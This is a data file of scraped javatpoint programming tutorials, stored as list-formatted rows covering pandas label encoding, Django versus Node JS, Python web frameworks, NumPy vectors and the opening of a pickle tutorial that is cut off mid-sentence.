\'Andy\', \'Sara\', \'Victor\', \'Martha\', \'Mindy\', \'Max\']', '}', 'blk = pd.DataFrame( my_data )', ""blk[ 'Gender' ] = blk[ 'Gender' ].astype( 'category' )"", 'print( blk.dtypes )', 'import pandas as pd', 'my_data = {', '""Gender"" : [\'F\', \'M\', \'M\', \'F\', \'M\', \'F\', \'M\', \'F\', \'F\', \'M\'],', '""Name"" : [\'Cindy\', \'Carl\', \'Johnny\', \'Stacey\', \'Andy\', \'Sara\', \'Victor\', \'Martha\', \'Mindy\', \'Max\']', '}', 'blk = pd.DataFrame( my_data )', 'print(""Genuine Data Frame:\\n"")', 'print( blk )', ""blk[ 'Gender' ] = blk[ 'Gender' ].astype( 'category' )"", 'print(""\\nData Frame after Label Encoding using Category codes:\\n"")', ""blk[ 'Gender' ] = blk[ 'Gender' ].cat.codes"", 'print( blk )']","['Geniune Data Frame:', 'Gender    Name', '0      F   Cindy', '1      M    Carl', '2      M  Johnny', '3      F  Stacey', '4      M    Andy', '5      F    Sara', '6      M  Victor', '7      F  Martha', '8      F   Mindy', '9      M     Max', 'Geniune Data Frame:', 'Gender    Name', '0      F   Cindy', '1      M    Carl', '2      M  Johnny', '3      F  Stacey', '4      M    Andy', '5      F    Sara', '6      M  Victor', '7      F  Martha', '8      F   Mindy', '9      M     Max', '[0 1]', 'Data Frame after Label Encoding:', 'Gender    Name', '0       0   Cindy', '1       1    Carl', '2       1  Johnny', '3       0  Stacey', '4       1    Andy', '5       0    Sara', '6       1  Victor', '7       0  Martha', '8       0   Mindy', '9       1     Max', 'Gender    object', 'Name      object', 'dtype: object', 'Gender    category', 'Name        object', 'dtype: object', 'Genuine Data Frame:', 'Gender    Name', '0      F   Cindy', '1      M    Carl', '2      M  Johnny', '3      F  Stacey', '4      M    Andy', '5      F    Sara', '6      M  Victor', '7      F  Martha', '8      F   Mindy', '9      M     Max', 'Data Frame after Label Encoding using Category codes:', 'Gender    Name', '0       0   Cindy', '1       1    Carl', '2       1  Johnny', '3       0  Stacey', '4       1    Andy', '5       0    Sara', '6       1  Victor', '7       0  Martha', '8       0   Mindy', '9       1     Max']","[""What is person's Gender?|||What is person's Marital Status?|||In which city does the person reside?&&&Male|||Single|||Delhi"", 'City where Person live|||Assigned Numerical Code&&&Delhi|||1&&&Mumbai|||2&&&Chennai|||3&&&Bangalore|||4', 'Feedback|||Assigned Numerical Code&&&Very Poor|||1&&&Poor|||2&&&Satisfactory|||3&&&Good|||4&&&Very Good|||5', 'State|||Confirmed|||Deaths|||Recovered&&&Maharashtra|||284281|||11194|||158140&&&Tamil Nadu|||156369|||2236|||107416&&&Delhi|||118645|||3545|||97693&&&Karnataka|||51422|||2089|||19729&&&Gujarat|||45481|||2089|||32103&&&Uttar Pradesh|||43441|||1046|||26675', 'State (Nominal Scale)|||State (Label Encoding)&&&Maharashtra|||3&&&Tamil Nadu|||4&&&Delhi|||0&&&Karnataka|||2&&&Gujarat|||1&&&Uttar Pradesh|||5']",['|||Label Encoding|||One-hot Encoding|||Ordinal Encoding||||||LabelEncoder class with the help of scikit-learn library|||Category Codes|||']
168,['Django vs. Node JS | Difference between Django and Node JS'],"['In this tutorial, we will discuss the primary difference between both trending technologies Django and Node JS. This tutorial will give you a deep analysis of both technologies that will help you select the appropriate language for projects or your career. We will explore all the essential topics as advantages, disadvantages, and their uses.']","['https://www.javatpoint.com/python-frameworks', 'https://www.javatpoint.com/label-encoding-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/django-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/nodejs-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/django-mvt', 'https://www.javatpoint.com/python-frameworks', 'https://www.javatpoint.com/label-encoding-in-python', 'https://www.javatpoint.com/python-frameworks']","['https://static.javatpoint.com/python/images/django-vs-node-js.png', 'https://static.javatpoint.com/python/images/django-vs-node-js2.png']",[],"['What is Django?', 'What is Node JS?', 'Difference between Django and Node.JS', 'Architectures of Node JS and Django', 'Advantages and Disadvantages of Django', 'Advantages and Disadvantages of Node JS', 'Conclusion']","['Features of Django', 'Features of Node JS', 'Django', 'Node JS']",[],"['Django comes with the many useful features.', 'Node JS consists of a non-blocking and event-driven model that makes it lightweight and effective.', 'Below are the few important features of Node JS.', ""The Node.JS library provides the superfast speed to execute the code as it is built upon Google Chrome's V8 JavaScript engine."", ""Node.JS application doesn't buffer while processing the data. These applications process the output data in portions."", 'Below are the few important pros and cons of Django.', 'Advantages', 'Disadvantages', 'Below are a few important pros and cons of Node JS.', 'Advantages', 'Before choosing anyone from them, we need to understand our requirements.']","['Django is a versatile framework and used to develop multi-purpose or any web applications. One of the advantages is that it can easily collaborate with the client-side framework and bring content in almost any format.', 'Django protects the web-applications against many security issues such as SQL injection, cross-site scripting, and cross-site request forgetting and clickjacking.', 'The architecture of Django is independent of others and can be changed or replace easily if required. The different parts of Django have a clear separation that means it can increase traffic by adding hardware at any level.', ""Django encourages writing maintainable and reusable code. It follows the DRY (Don't Repeat Yourself) approach, so we will not get any unnecessary duplication. It promotes the grouping of related functionality into the reusable application."", ""Node JS's APIs are asynchronous and event-driven, which means a Node JS bases server doesn't need to wait for an API to return data. A notification mechanism informs the server that the previous API generates a response while working on the new API."", 'Django is much secure where it maintains passwords effectively and Node JS provides many libraries, which helps the developer create highly flexible web apps.', 'There is no specific answer to the question, ""Which technology is much better?"" All we need to understand the project requirements then should move to the most appropriate technology.']","[""Both technologies are much powerful in building the various purpose web-applications with an excellent user interface. Both are open-source, which means anyone can use them without any paid license. Let's have an overview of each technology which is given below."", 'Django is a high-level web framework that permits the user to develop secure and maintainable websites. It is written in the Python programming language. Experienced programmers build it. Django handles the hassle of Web development so that users can write efficient web-applications. It has a vast active community, excellent documentation, and other features.', 'Django is based on the ""Battery included"" approach that allows the developer to do the things ""out of the box."" It provides almost every feature that works seamlessly together and follows a consistent design principle. If the user stuck while using it, he/she can take help from its up-to-date documentation.', 'Security is the main reason for the popularity of Django. It provides the best security to the web-application and avoids common security mistakes. It has been engineered to ""do the right things"" that automatically protects web applications. Django comes with a secure way to manage the password; it also avoids common mistakes such as putting session information in cookies where it is susceptible.', 'Node JS is a server-side JavaScript platform; it is intended to build scalable network applications and was developed by Ryan Dahl in 2009. Node JS is a cross-platform runtime environment that is used for evolving server-side as well as networking applications.', 'Node.JS is highly scalable because it uses a single-threaded model with event looping. Its event mechanism allows the server to respond in a non-blocking way where the traditional servers create limited threads to handle requests. It makes Node.JS highly scalable. The Node.JS single thread program can provide the service to a large number compared to traditional servers such as Apache HTTP.', 'Django follows the MVT (Model View Template) architecture. It provides several advantages over the many old frameworks. It helps the developer to build apps faster and advanced. Its component-based pattern helps in ease modification. One change in a component does not affect the whole application or another component.', 'Node JS architecture is quite dissimilar to the other server-side platforms. It is based on the even loop architecture and single-threaded that helps to build high-end applications. The advantage of single-threaded is that there is no context switching between that helps to reduce reloads. In Node JS, handling multiple concurrent requests is easy and very fast. It provides robustness to the application and making them available for processing requests without delay.', 'In this tutorial, we have learned the difference between two leading web technologies - Node JS and Django. Moreover, we have also discussed the various aspects of both technologies. Both technologies are suitable to build large-scale web applications or web apps.']",[],[],"[""Characteristics|||Django|||Node JS&&&Definition|||Django is Python based web framework. It is an open-source platform to build rich web applications.|||Node JS is an open-source web application that runs on JavaScript designed to build powerful APIs (Client-side).&&&Security|||It provides strong security and comes with highly protected built-in system which prevents any deficiency.|||It is not secure as Django and requires manual operations to handle the security issues.&&&Performance|||It provides much better performance and helping to create major web-applications. It comes with a built-in house template system that facilitates the execution of a required task quickly.|||Node JS's performance is quite impressive as it provide the freedom to developers. But it takes much time to develop the application.&&&Efficiency|||Django is very efficient and provides fast speed. And so, it is cost effective.|||It consumes more operating time. However, it is easy to learn. It is less cost effective.&&&Architecture|||It follows the MVT model template view.|||It works on the event-driven model. It runs on an operating system maintaining a small stack of requests. &&&Flexibility|||This framework is less flexible and has quite strict development features.|||In Node JS, there are various tools and features available because it is built upon a JavaScript library.&&&Development Speed|||It takes less operating time due to the built-in system; However, it is time-consuming to learn if the developer doesn't know python.|||It takes more operating time but if developers are experienced with JavaScript then it is quite helpful.&&&Tool Type|||It is a web framework.|||It is a runtime environment.&&&Community|||Django has a vast community across the world and up-to-date documentation.|||It also has a vast community.""]",['|||Complete||||||Versatile||||||Secure||||||Scalable||||||Maintainable||||||Asynchronous and Event-Driven||||||Speed||||||Highly Scalable||||||No Buffering||||||It provides better security to the web-application.|||It takes less time to complete large projects as compared to other frameworks.|||It offers a better performance level with in-build templates.|||It is comparatively easy to learn.||||||It allows the building of only single-tiered applications.|||It is not suitable for small apps.|||It requires more understanding of the framework.||||||It has an active and huge community across the world.|||It is open-source and consists of more libraries.|||It has an easier system to follow with less complicated features.|||We can execute commands open handily.|||']
169,['Top Python Frameworks| Python Framework List'],"[""In this tutorial, we will discuss Python's various important frameworks and their essential features. As we know, Python is a highly demanded and effective programming language, and it contains vast libraries and frameworks which for almost every technical domain.""]","['https://www.javatpoint.com/how-to-create-a-vector-in-python-using-numpy', 'https://www.javatpoint.com/django-vs-node-js', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/#Bottle', 'https://www.javatpoint.com/#CherryPy', 'https://www.javatpoint.com/#AIOHTTP', 'https://www.javatpoint.com/#Dash', 'https://www.javatpoint.com/#Falcon', 'https://www.javatpoint.com/#Flask', 'https://www.javatpoint.com/#Giotto', 'https://www.javatpoint.com/#Django', 'https://www.javatpoint.com/#Growler', 'https://www.javatpoint.com/#Uvloop', 'https://www.javatpoint.com/#Sanic', 'https://www.javatpoint.com/#MorePath', 'https://www.javatpoint.com/#Picnic', 'https://www.javatpoint.com/#Pylons', 'https://www.javatpoint.com/#Pyramid', 'https://www.javatpoint.com/#TurboGears', 'https://www.javatpoint.com/#Web2py', 'https://www.javatpoint.com/#Hug', 'https://www.javatpoint.com/#CubicWeb', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/reactjs-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/openstack', 'https://www.javatpoint.com/https://www.javatpoint.com/ruby-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/mysql-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/postgresql-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/sqlite-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/oracle-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/restful-web-services-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/perl-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/sql-tutorial', 'https://www.javatpoint.com/how-to-create-a-vector-in-python-using-numpy', 'https://www.javatpoint.com/django-vs-node-js', 'https://www.javatpoint.com/how-to-create-a-vector-in-python-using-numpy']","['https://static.javatpoint.com/python/images/python-frameworks.png', 'https://static.javatpoint.com/python/images/python-frameworks1.jpg', 'https://static.javatpoint.com/python/images/python-frameworks2.png', 'https://static.javatpoint.com/python/images/python-frameworks3.png', 'https://static.javatpoint.com/python/images/python-frameworks4.png', 'https://static.javatpoint.com/python/images/python-frameworks5.jpg', 'https://static.javatpoint.com/python/images/python-frameworks6.png', 'https://static.javatpoint.com/python/images/python-frameworks7.png', 'https://static.javatpoint.com/python/images/python-frameworks8.png', 'https://static.javatpoint.com/python/images/python-frameworks9.jpg', 'https://static.javatpoint.com/python/images/python-frameworks10.jpg', 'https://static.javatpoint.com/python/images/python-frameworks11.png', 'https://static.javatpoint.com/python/images/python-frameworks12.jpg', 'https://static.javatpoint.com/python/images/python-frameworks13.png', 'https://static.javatpoint.com/python/images/python-frameworks14.png', 'https://static.javatpoint.com/python/images/python-frameworks15.png']",[],"['Types of Python Frameworks', 'Best Python Frameworks', 'Conclusion']","['1. Bottle', '2. CherryPy', '3. AIOHTTP', '4. Dash', '5. Falcon', '6. Flask', '7. Giotto', '8. Django', '9. Growler', '10. Uvloop', '11. Sanic', '12. MorePath', '13. Picnic', '14. Pylons Framework', '15. Pyramid', '16. TurboGears', '17. Web2Py', '18. Hug', '19. CubicWeb']",[],"['Python comes with many frameworks, and each framework has its advantages and disadvantages.', 'All we need to analyze our project requirements to choose the appropriate frameworks.', 'We will discuss the following Python frameworks.', 'There are primarily three types of frameworks as follows.', '1. Full-Stack framework', '2. Microframework', '3. Asynchronous Framework', ""Let's see the following Python frameworks."", 'Below is the list of top Python frameworks.', 'Key features of Bottle', 'Key features of CherryPy', 'Key features of AIOHTTP', ""Dash's application can also run the webserver such as Flask and communication with JSON packets via HTTP requests."", 'Key features of Dash', 'Key features of Falcon', 'It is lightweight and has a modular design. Flask is readily adaptable.', 'Key features of Flask', 'It also comes with the controller module that offers developers a platform to create apps using the command line and Internet Relay charts (IRC).', 'Key Features of Giotto', 'Key Features of Django', 'Key Features of Growler', 'Key Features of Uvloop', 'Key Features of Sonic', 'It provides an outstanding feature that automatically converts defined paths in the framework into links for creating apps with the cleanest URLs.', 'Key features of Morepath', 'Key Features of Picnic', 'Key Features of Pylons', 'Key Features of Pyramid', 'Key features of TurboGears', 'Key features of web2py', 'Key features of Hug', 'Key features of Cubic Web']","['The frameworks provide easiness while developing an application (or software) to developers. They offer automatic implementation of redundant tasks, reduce development time, and focus significantly on application logic rather than a common element.', ""There are mainly three types of Python frameworks, full-stack, micro-framework, and asynchronous. Before explaining each framework in detail, let's briefly introduce various kinds of Python frameworks."", 'These frameworks have all web development requirements such as form generators, form validation, and template layouts. These are the core features of a typical full-stack Framework.', ""Micro frameworks require lots of code and additional requirements manually. This kind of framework doesn't provide the data abstraction layer's facility, form validation, and specific tools and libraries."", 'Asynchronous frameworks are gaining popularity recently allows for handling a large set of concurrent connections. It uses the asyncio library to run the process concurrently.', ""It is a Python-based micro framework used to develop analytical web applications and popular among data scientists. It is suitable for those data scientists who aren't much into web development mechanics."", 'It is a micro-framework used for building web APIs, and it is another widely used Python framework. It requires many dependencies for building HTTP APIs and allows the developer to create a cleaner design that permits HTTP and REST architecture.', 'Falcon is widely used in big organizations like LinkedIn, OpenStack, and RackSpace. It can handle more requests with the same hardware than all its contemporaries. This framework focuses on having 100% code coverage.', 'Flask is another popular Python micro-framework that comes under the BSD license. The Sinatra Ruby framework inspires it. This framework requires Jinja2 templates and the Werzeug WSGI toolkit.', 'Using the Flask, developers can build a solid web application foundation from where it is possible to use any extension required. It is also compatible with Google App Engine.', 'Django offers several built-in libraries and excellent features that are available for free to use. Django makes use of its ORM for mapping objects to database tables.', 'It offers database support as well as provides easiness to migrate from one database to another. However, it has inherent support of MySQL, PostgreSQL, SQLite, and Oracle database. We can also use the other database using via third-party drivers.', 'It is an object-oriented microframework used to develop JSON-based APIs. This framework is optimized for JSON-based APIs, which can hold the position among the best Python frameworks because it creates the fastest web APIs.', 'Pylons framework is a Full-stack, open-source framework that aims at the rapid development of applications. This framework includes some of the best elements and properties of Perl, Python, and Ruby.', 'It is available in the maintenance mode, though many developers still use the Pylons framework because it provides a highly flexible web development structure. It promotes reusability and makes use of WSGI (Web Server Gateway Interface).', 'This microframework is used to develop and build the web APIs. It consumes the resources when required and uses Cython for compilation and this framework allows us to complete the application development very easily and quickly.']","[""It is a microframework that creates a single source of file for every developed application using it. This framework primarily focuses on developing APIs, and it is one of the finest Python web-framework. The Bottle doesn't require the other dependencies to create small web applications. It allows the developer to work closely with the hardware, and it is the most suited framework to make small apps and simplistic person-use apps."", ""CherryPy is an open-source, object-oriented micro-framework. It follows the minimalistic approach. This is one of the oldest Python frameworks that were introduced in 2002. We don't need to install the apache server to run cherryPy. This framework allows us to use any technology for data access, templating at Cetera."", 'It is an Asynchronous framework that depends intensely on Python 3.5+ features, such as async & await. The Python asyncio library plays a vital role in the functioning of this framework. Being a server web framework, AIOHTTP can also serve as a client framework. We can redirect the queries using the request object and router.', ""ReactJS is used for rendering the frontend. We can extend the capabilities of Dash using Flask plugins. Applications developed using the Dash are rendered in a web browser and can be deployed to the server. These applications are cross-platform and mobile ready. Let's see the key features of the Dash framework."", 'It is a full-stack framework based on the Model View Controller (MVC). Giotto is an application framework and separates the Model, View, and controller elements in order. It provides some essential characteristics such as automatic URL routing and Jinja2 for HTML templates with an API and accessible RESTful interface.', ""Django is a full-stack Python framework. It is a most famous and beloved framework for developing rich web applications. It is gaining popularity bypassing the time. It ended up being one of the top 10 web development frameworks in 2021. It focuses on the DRY (Don'tRepeat Yourself) principle."", 'It is an Asynchronous framework built upon the asyncio; it is inspired by the Node JS and the Express/Connect frameworks. In this framework, the request is not handled by the framework itself, but it is dealt with by passing through middleware technology. It is a best-fitted framework to implement complex applications more straightforwardly.', 'It is meant to be one of the superfast Python web frameworks available amongst the rest of the frameworks, and we cannot ignore that fact. It is considered a substitute for the asyncio event loop; hence, it can be either used in the asyncio-based application or to replace an asyncio in the existing application. Some developers claim Uvloop is twice as fast as Node JS, events, and any Python asynchronous framework.', 'Sanic is a web framework built on the top of the up loop. It provides one of the best features, i.e., it offers fast HTTP responses via asynchronous request handling. It provides non-blocking capabilities that improve speed. Moreover, it supports the request handlers and compares them with Python 3.5 await/async functions.', 'MorePath is a Python WSGI framework, and it is primarily focused on executing more numbers use cases. Moreover, it takes responsibility for Answer Set Application Programming (ASAP). It also includes a standard Python data structure induced into RESTful Web Services.', 'The Pyramid is an open-source full-stack web framework that aims to reduce as much as the complexity. One of the best advantages of Pyramid is that it can work equally well with small and large-scale applications. Pyramid updates regularly by its developers and runs on Python 3. The current version of Pyramids is 1.10, and it is the tenth update since 2010.', 'TurboGears is a full-stack, open-source, data-driven web application Python framework. It allows developers to develop rapid data-driven web applications. TurboGears comes with the intelligible Templating and supports flexible and powerful ORM. This framework uses components such as Genshi, Repoze, SQLAlchemy, and webOp to develop quickly develops apps demanding database connectivity.', 'Web2Py framework is an open-source and scalable Python framework that allows users to develop web applications quickly and smoothly. It is platform-independent, which means it supports all the popular operating systems. Furthermore, this framework provides the facility to simplify the web application development process through a web-based interface, a web server, and a SQL database.', 'Cubic Web is a full stack framework developed and curated by Logilab, it is a free-to-use, semantic, open-source, sematic, open-source, Python-based web framework. Cubic web is based on the data model, and required to have the same defined in order to develop a function application. Cubic web uses cube where other application uses separate views and models.', 'In this tutorial, we have mentioned all the essential python frameworks that belong to various categories. This framework can meet the business requirements effectively. We have covered almost every import Python frameworks and their useful features. A developer can choose any framework according to project requirements.']",[],[],[],"['|||Bottle|||CherryPy|||AIOHTTP|||Dash|||Falcon|||Flask|||Giotto|||Django|||Growler|||Uvloop|||Sanic|||MorePath|||Picnic|||Pylons Framework|||Pyramid|||TurboGears|||Web2py|||Hug|||CubicWeb||||||It is a built-in HTTP server.|||It comes with plugins support for different databases.|||It offers the request-dispatching route.|||We can access the 3rd party template engine and WSGI/HTTP servers.||||||CherryPy application runs on Android.|||It has a flexible built-in system.|||It provides a robust configuration system.|||It offers inbuilt support for coverage, profiling, and testing.|||Offers simplicity for running multiple HTTP servers simultaneously.||||||It has Pluggable routing.|||It provides the facility to build the view effectively.|||Signals.|||It supports both server WebSockets and client WebSockets without the callback hell.|||It gives the middleware supports.||||||There is extensive plugin support.|||It works on URL routine (Dash Development Server).|||It supports a high degree of customization.|||It can handle errors effectively.|||LDAP integration (Dash Development server).|||Less code needed for creating Dash apps.||||||Upfront exception handling|||It can provide extra speed with Cython support.|||It has a highly-optimized code base and also extensible.|||Unit testing via WSGI helper and mocks.|||Its request and responsive classes provide easy access for headers and bodies.|||Native HTTP error responses.||||||It provides built-in support.|||It supports jinja2 templating.|||It has Unicode-based.|||HTTP request handling.|||It has a built-in fast debugger.|||It helps for plugging in any ORM.|||It supports secure cookies to establish client-side sessions.||||||It has a facility for automatic URL routing.|||Functional crud patterns.|||There are multiple pluggable controllers.|||Generic model and views.|||Obtainability of Jinja2 for HTML templates.|||Tremendously succinct code.|||Database support with SQLAlchemy.||||||It is much secure as compare to other web frameworks.|||URL routing.|||Template engine.|||Database schema migration.|||Authentication support.|||It has ORM (Object Relation Model).|||A plethora of ready-to-use libraries.||||||Support for a multitude of open-source packages.|||Use decorator for writing clean, reusable code.|||It uses the decorators to reduce the complexity of code, and we can write the reusable code.|||There is a ziapp module that allows zipping an entire application into a single executable file.||||||Lighting fast speed|||Replacement of asyncio event loop.||||||Class-based views.|||Plugging support|||Capable of reading and writing cookies.|||It allows various types of logging like error logs and access logs.|||Availability of handlers with easy to apply for decorators support.||||||It provides simple, flexible, and robust permissions.|||Creating a generic user interface is a simple as sub-classing.|||All views are generic, Reuse views in views.|||It offers all the necessary tools to develop RESTful web services.|||It is extensible with a simple, coherent, and universal extension and overrides mechanism.||||||It gives support for cookies.|||Handling routing.|||It has built-in error handling.|||It is capable of handling JSON-based requests.||||||Routes.|||It dispatches the URLs.|||URL mapping based on Routes configuration via WebHelpers.|||It provides HTML form validation and generation.||||||URL Generation|||Single-file applications|||It has flexible authentication and authorization.|||View predicates and many per-route views.|||Renders.|||Predicates.|||Templating and asset specification.|||Function Decorators.||||||All features of TurboGears are implemented as function decorators.|||Available command-line tools.|||Multi-database support.|||MVC-style architecture.|||It uses pylons as a web server.|||PasteScript templates.|||Validation support with Form Encode.||||||A consistent API.|||Follow MVC pattern.|||Role-based access control.|||Devoid installation and configuration requirements.|||It provides support for internationalization.|||Backward compatibility.|||Readability of multiple protocols.|||It can run on any web hosting platform that offers support for either Python or Java and Python.||||||Support automatic documentation.|||Built-in version management.|||Follows the principle ""once implemented, can use anywhere"".||||||Support for multiple databases.|||Security.|||Reusable Components.|||Simplifies data-related queries with RQL.|||OWL (Web Ontology Language).|||']"
170,['How to create a vector in Python using NumPy'],"['In this tutorial, we will learn how we can create a vector using Numpy library. We will also explore basic operation of vector such as performing addition of two vectors, subtraction of two vectors, division of two vectors, multiplication of two vectors, vector dot product and vector scalar product.']","['https://www.javatpoint.com/pickle-module-of-python', 'https://www.javatpoint.com/python-frameworks', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-array', 'https://www.javatpoint.com/pickle-module-of-python', 'https://www.javatpoint.com/python-frameworks', 'https://www.javatpoint.com/pickle-module-of-python']",[],[],"['Basic Operation of Python vector', 'Subtraction of Two Vectors', 'Multiplication of Two Vectors', 'Division Operation of Two vectors', 'Vector Dot Product', 'Vector-Scalar Multiplication']","['What is Vector?', 'Creating Vector in Python', 'Addition of Two Vectors']",[],"['Python Numpy module provides the numpy.array() method which creates a one dimensional array i.e. a vector. A vector can be horizontal or vertical.', 'The above method accepts a list as an argument and returns numpy.ndarray.', ""Let's understand the following example -"", 'Example - 1: Horizontal Vector', 'Example - 2: Vertical Vector', 'After creating a vector, now we will perform the arithmetic operations on vectors.', 'Below is the list of basic operations that we can perform in vector.', ""Let's understand the following example."", 'The multiplication is performed as follows.', ""The first element of the vector 1 is multiplied by corresponding vector's 2 first element and so on."", ""In the division operation, the resultant vector contains the quotient value that is get from the division of two vector's elements."", ""Let's understand the following example."", 'Example - ', 'As we can see in the above output, the division operation returned the quotient value of elements.', ""Let's understand the following example."", ""In the scalar multiply operation; we multiply the scalar with the each component of the vector. Let's understand the following example."", 'In the above code, the scalar value multiplied by the each element of the vector in s * v = (s * v1, s * v2, s * v3) manner.']","[""Vectors are very important in the Machine learning because they have magnitude and also the direction features. Let's understand how we can create the vector in Python."", 'In the vector addition, it takes place element-wise manner which means addition will happen element by element and the length would same as of the two additive vectors.', ""The subtraction performs same as the addition, it follows the element-wise approach and vector 2 elements will get subtracted from the vector 1. Let's understand the following example."", ""The vector 1 elements are multiplied by the vector 2 and return the same length vectors as the multiplying vectors. Let's understand the following example."", 'The vector dot product performs between the two same-length sequential vectors and returns the single dot product. We will use the .dot() method to perform the dot product. It will happen as below.']","['A vector is known as a single dimension-array. In Python, vector is a single one-dimension array of lists and behaves same as a Python list. According to a Google, vector represents direction as well as magnitude; especially it determines the position one point in a space relative to another.']","['np.array(list)', '# Importing numpy', 'import numpy as np', '# creating list', 'list1 = [10, 20, 30, 40, 50]', '# Creating 1-D Horizontal Array', 'vtr = np.array(list1)', 'vtr = np.array(list1)', 'print(""We create a vector from a list:"")', 'print(vtr)', '# Importing numpy', 'import numpy as np', '# defining list', 'list1 = [[12],', '[40],', '[6],', '[10]]', '# Creating 1-D Vertical Array', 'vtr = np.array(list1)', 'vtr = np.array(list1)', 'print(""We create a vector from a list:"")', 'print(vtr)', 'vector + vector', 'import numpy as np', 'list1 = [10,20,30,40,50]', 'list2 = [11,12,13,14,15]', 'vtr1 = np.array(list1)', 'vtr2= np.array(list2)', 'print(""We create vector from a list 1:"")', 'print(vtr1)', 'print(""We create vector from a list 2:"")', 'print(vtr2)', 'vctr_add = vctr1+vctr2', 'print(""Addition of two vectors: "",vtr_add)', 'import numpy as np', 'list1 = [10,20,30,40,50]', 'list2 = [5,2,4,3,1]', 'vtr1 = np.array(list1)', 'vtr2= np.array(list2)', 'print(""We create vector from a list 1:"")', 'print(vtr1)', 'print(""We create a vector from a list 2:"")', 'print(vtr2)', 'vtr_sub = vtr1-vtr2', 'print(""Subtraction of two vectors: "",vtr_sub)', 'import numpy as np', 'list1 = [10,20,30,40,50]', 'list2 = [5,2,4,3,1]', 'vtr1 = np.array(list1)', 'vtr2= np.array(list2)', 'print(""We create vector from a list 1:"")', 'print(vtr1)', 'print(""We create a vector from a list 2:"")', 'print(vtr2)', 'vtr_mul = vtr1*vtr2', 'print(""Multiplication of two vectors: "",vtr_mul)', 'import numpy as np', 'list1 = [10,20,30,40,50]', 'list2 = [5,2,4,3,1]', 'vtr1 = np.array(list1)', 'vtr2= np.array(list2)', 'print(""We create vector from a list 1:"")', 'print(vtr1)', 'print(""We create a vector from a list 2:"")', 'print(vtr2)', 'vtr_div = vtr1/vtr2', 'print(""Division of two vectors: "",vtr_div)', 'vector c = x . y = (x1 * y1 + x2 * y2)', 'import numpy as np', 'list1 = [10,20,30,40,50]', 'list2 = [5,2,4,3,1]', 'vtr1 = np.array(list1)', 'vtr2= np.array(list2)', 'print(""We create vector from a list 1:"")', 'print(vtr1)', 'print(""We create a vector from a list 2:"")', 'print(vtr2)', 'vtr_product = vtr1.dot(vtr2)', 'print(""Dot product of two vectors: "",vtr_product)', 'import numpy as np', 'list1 = [10,20,30,40,50]', 'vtr1 = np.array(list1)', 'scalar_value = 5', 'print(""We create vector from a list 1:"")', 'print(vtr1)', '# printing scalar value', 'print(""Scalar Value  : "" + str(scalar_value))', 'vtr_scalar = vtr1 * scalar_value', 'print(""Multiplication of two vectors: "",vtr_scalar)']","['We create a vector from a list:', '[10 20 30 40 50]', 'We create a vector from a list:', '[[12]', '[40]', '[ 6]', '[10]]', 'We create vector from a list 1:', '[10 20 30 40 50]', 'We create vector from a list 2:', '[11 12 13 14 15]', 'Addition of two vectors:  [21 32 43 54 65]', 'We create vector from a list 1:', '[10 20 30 40 50]', 'We create vector from a list 2:', '[5 2 4 3 1]', 'Subtraction of two vectors:  [5 18 26 37 49]', 'We create vector from a list 1:', '[10 20 30 40 50]', 'We create vector from a list 2:', '[5 2 4 3 1]', 'Multiplication of two vectors:  [ 50  40 120 120  50]', 'vct[0] = x[0] * y[0]', 'vct[1] = x[1] * y[1]', 'We create vector from a list 1:', '[10 20 30 40 50]', 'We create vector from a list 2:', '[5 2 4 3 1]', 'Division of two vectors:  [ 2.   10.          7.5        13.33333333        50.        ]', 'We create vector from a list 1:', '[10 20 30 40 50]', 'We create vector from a list 2:', '[5 2 4 3 1]', 'Dot product of two vectors:  380', 'We create vector from a list 1:', '[10 20 30 40 50]', 'Scalar Value : 5', 'Multiplication of two vectors:  [ 50 100 150 200 250]']",[],['|||Arithmetic|||Subtraction|||Multiplication|||Division|||Dot Product|||Scalar Multiplications|||']
171,['Pickle Module of Python'],"[""A developer may sometimes want to send some complex object commands through the network and save the internal state of their objects to the disk or database for using it later. To achieve this, the developer can use the serialization process, which is supported by the standard library, cause of Python's Pickle Module.""]","['https://www.javatpoint.com/how-to-convert-bytes-to-string-in-python', 'https://www.javatpoint.com/how-to-create-a-vector-in-python-using-numpy', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/xml-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-modules', 'https://www.javatpoint.com/https://realpython.com/python38-new-features/', 'https://www.javatpoint.com/https://en.wikipedia.org/wiki/Out-of-band_data', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/how-to-convert-bytes-to-string-in-python', 'https://www.javatpoint.com/how-to-create-a-vector-in-python-using-numpy', 'https://www.javatpoint.com/how-to-convert-bytes-to-string-in-python']",[],[],"['Serialization in Python', 'Inside The pickle Module', 'Protocol Formats of the Pickle Module in Python', 'Types of Pickleable and Unpickleable', 'Conclusion:']",['Compression of the Pickle Objects'],[],"['The process of serializing is to convert the data structure into a linear form, which can be stored or transmitted through the network.', 'In Python there are three modules in the standard library that allows the developer to serialize and deserialize the objects:', 'Python also supports XML, which developers can use for serializing the objects.', 'There are numerous reasons for choosing the JSON format:', 'With json Module, the developer can do serializing and deserializing different standard Python types:', 'The pickle module of python contains the four methods:', 'The first two methods are used for the pickling process, and the next two methods are used for the unpickling process.', ""For differentiation dumps() from the dump(), the developer can remember that in the dumps() function, ' s' stands for the string."", 'Suppose the user has a custom -defined class named 